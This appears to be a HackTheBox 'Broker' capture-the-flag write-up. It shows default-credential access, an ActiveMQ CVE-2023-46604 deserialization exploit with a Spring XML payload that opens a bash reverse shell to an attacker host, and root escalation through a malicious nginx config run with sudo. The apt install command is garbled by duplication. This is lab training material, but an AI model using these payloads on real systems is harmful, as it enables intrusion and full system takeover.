---
title: "Broker"
date: 2025-12-20
draft: false
description: "HackTheBox Broker writeup"
tags: ["hackthebox", "htb", "linux", "easy", "oscp"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# Broker

## Overview

- **OS:** Linux
- **IP:** 10.129.230.87
- **Difficulty:** Easy
- **Platform:** HackTheBox
- **OSCP:** Yes
- **Lists:** N/A

### Summary

Gained access with RCE exploit that for activemq that trusts a xml file easily, and then priv esc with sudo perms over being able to upload a nginx config file.

## Enumeration

**nmap scan results**

{{< figure src="image 227.png" >}}

on visiting the site we are prompted with a portal, when we try default admin/admin we get access to the manager portal

{{< figure src="image 228.png" >}}

{{< figure src="image 229.png" >}}

lets get javac with 

```
    sudo apt install default-jdk -sudo apt install default-jdk -y
```

## Vulnerabilities


## Exploitation


lets grab the exploit

```
    git clone https://github.com/evkl1d/CVE-2023-46604.git
```

to run this exploit we need to provide a xml rev shell that the server will deserialize and hopefully run the bad code.

```
    <?xml version="1.0" encoding="UTF-8" ?>
        <beans xmlns="http://www.springframework.org/schema/beans"
           xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
           xsi:schemaLocation="
         http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
            <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
                <constructor-arg>
                <list>
                    <value>bash</value>
                    <value>-c</value>
                    <value>bash -i &gt;&amp; /dev/tcp/10.10.10.10/9001 0&gt;&amp;1</value>
                </list>
                </constructor-arg>
            </bean>
        </beans>
```

with this we get our rev shell

{{< figure src="image 230.png" >}}

{{< figure src="image 231.png" >}}

{{< figure src="image 232.png" >}}

we can run this binary with full perms

{{< figure src="image 233.png" >}}

we will use a malicious config file and elevate our privs with nginx

`nano /tmp/root.conf`

{{< figure src="image 234.png" >}}

```
    user root;
    worker_processes 1;
    
    events {
        worker_connections 1024;
    }
    
    http {
        server {
            listen 9001;
            location / {
                root /;
            }
        }
    }
```

`sudo /usr/sbin/nginx -c /tmp/root.conf`

and now we can grab the root flag file

{{< figure src="image 235.png" >}}
